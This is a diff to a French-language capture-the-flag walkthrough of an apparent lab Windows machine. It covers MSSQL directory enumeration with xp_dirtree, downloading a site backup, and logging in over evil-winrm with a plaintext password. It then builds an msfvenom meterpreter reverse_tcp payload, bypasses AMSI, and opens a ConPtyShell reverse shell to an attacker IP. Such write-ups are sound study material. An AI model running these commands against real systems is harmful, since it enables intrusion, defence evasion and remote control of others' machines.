@@ -286,3 +286,165 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [!] Press help for extra shell commands
 SQL (MANAGER\Operator  guest@master)> 
 ```
+Maintenant faisons un peu de commands sur ceci
+```
+SQL (MANAGER\Operator  guest@master)> select @@version;
+----------------------------------------------------------------------------------   
+Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
+        Sep 24 2019 13:48:23 
+        Copyright (C) 2019 Microsoft Corporation
+        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
+SQL (MANAGER\Operator  guest@master)> select user_name();
+        
+-----   
+guest   
+```
+Maintenant pour lister les fichiers et tout autre dans `mssql` on utilise `xp_dirtree`
+```
+SQL (MANAGER\Operator  guest@master)> xp_dirtree
+subdirectory                depth   file   
+-------------------------   -----   ----   
+$Recycle.Bin                    1      0   
+Documents and Settings          1      0   
+inetpub                         1      0   
+PerfLogs                        1      0   
+Program Files                   1      0   
+Program Files (x86)             1      0   
+ProgramData                     1      0   
+Recovery                        1      0   
+SQL2019                         1      0   
+System Volume Information       1      0   
+Users                           1      0   
+Windows                         1      0   
+```
+Maintenant ici je vais voir le directory `inetpub`
+```
+EXEC xp_dirtree 'C:\inetpub';
+subdirectory                     depth   
+------------------------------   -----   
+custerr                              1   
+en-US                                2   
+history                              1   
+logs                                 1   
+temp                                 1   
+appPools                             2   
+IIS Temporary Compressed Files       2   
+wwwroot                              1   
+css                                  2   
+images                               2   
+js                                   2   
+```
+Maintenant voyons voir le `wwwroot`
+```
+SQL (MANAGER\Operator  guest@master)> EXEC xp_dirtree 'C:\inetpub\wwwroot', 1,1;
+subdirectory                      depth   file   
+-------------------------------   -----   ----   
+about.html                            1      1   
+contact.html                          1      1   
+css                                   1      0   
+images                                1      0   
+index.html                            1      1   
+js                                    1      0   
+service.html                          1      1   
+web.config                            1      1   
+website-backup-27-07-23-old.zip       1      1   
+```
+Je trouve un backup dans le site, now vas sur le site et telecharge
+`└─# wget http://manager.htb/website-backup-27-07-23-old.zip`
+
+## Evil-winrm
+Maintenant j'ai pu trouver d'autre `user` and `password`, je vais essayer de me connecter sur la machine distant grace a `evil-winrm` au port `5985`
+
+```
+nmap -p 5985,5986 192.168.1.19
+nc -nv $ip 5985
+(UNKNOWN) [10.10.11.236] 5985 (?) open
+
+```
+```
+└─# evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                                     
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Raven\Documents> dir
+*Evil-WinRM* PS C:\Users\Raven\Documents> whoami
+manager\raven
+```
+Maintenant je vais creer un payload, ensuite l'executer avec `evil-winrm` avec le `    -e, --executables EXES_PATH      C# executables local path`
+```
+└─# msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.16.35 lport=443 -f exe > rev.exe
+
+└─# evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123' -e /home/bloman/CTFs/Boot2root/VMs
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Raven\Documents> Bypass-4MSI
+                                        
+Info: Patching 4MSI, please be patient...
+                                        
+[+] Success!
+*Evil-WinRM* PS C:\Users\Raven\Documents>*Evil-WinRM* PS C:\Users\Raven\Documents> menu
+
+
+   ,.   (   .      )               "            ,.   (   .      )       .   
+  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+        \/                               \/          \/       \/         \/
+
+       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
+
+[+] Dll-Loader 
+[+] Donut-Loader 
+[+] Invoke-Binary
+[+] Bypass-4MSI
+[+] services
+[+] upload
+[+] download
+[+] menu
+[+] exit
+```
+ici j'ai afficher le `menu`, avec le `Invoke-Binary`, je vais bien executer mon payload dans le systems
+```
+*Evil-WinRM* PS C:\Users\Raven\Documents> Invoke-Binary /home/bloman/CTFs/Boot2root/VMs/rev.exe
+```
+
+Pour afficher la version de l'ordinateur `Get-ComputerInfo`
+```
+*Evil-WinRM* PS C:\Users\Raven\Documents> Get-ComputerInfo
+
+WindowsBuildLabEx                                       : 17763.1.amd64fre.rs5_release.180914-1434
+WindowsCurrentVersion                                   : 6.3
+WindowsEditionId                                        : ServerStandard
+WindowsInstallationType                                 : Server
+WindowsInstallDateFromRegistry                          : 7/20/2021 7:21:49 PM
+WindowsProductId                                        : 00429-00521-62775-AA946
+WindowsProductName                                      : Windows Server 2019 Standard
+WindowsRegisteredOrganization                           :
+WindowsRegisteredOwner                                  : Windows User
+WindowsSystemRoot                                       : C:\Windows
+WindowsVersion                                          : 1809
+BiosCharacteristics                                     :
+BiosBIOSVersion                                         :
+BiosBuildNumber                                         :
+```
+**Shell**
+NOTE: `ConPtyShell` uses the function CreatePseudoConsole(). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).
+```
+
+*Evil-WinRM* PS C:\Users\svc_backup\Downloads> IEX(Get-Content .\Invoke-ConPtyShell.ps1 -Raw); Invoke-ConPtyShell -RemoteIp 10.10.16.35 -RemotePort 443 -Rows 38 -Cols 154
+
+└─# nc -lnvp 443 
+listening on [any] 443 ...
+connect to [10.10.16.35] from (UNKNOWN) [10.10.11.236] 61457
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+```
